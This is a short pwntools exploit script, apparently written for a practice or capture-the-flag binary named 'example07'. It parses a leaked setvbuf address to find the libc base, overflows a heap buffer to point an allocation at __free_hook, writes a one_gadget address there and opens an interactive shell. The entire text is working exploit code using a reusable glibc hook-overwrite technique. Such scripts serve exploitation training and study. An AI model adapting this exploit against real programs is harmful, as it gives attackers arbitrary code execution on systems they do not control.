from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']


p = process('./example07')
gdb.attach(p)

binary = ELF('./example07')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
one_gadget_offset = 0x4f3c2 # [rsp+0x40] = 0

setvbuf_addr = int(p.recvline()[2:], 16)
libc_base = setvbuf_addr - libc.symbols['setvbuf']
free_hook = libc_base + libc.symbols['__free_hook']
one_gadget_addr = one_gadget_offset + libc_base


p.sendline(b'A' * (0x30-8) + p64(0x30) + p64(free_hook))
p.sendline(p64(one_gadget_addr))

p.interactive()
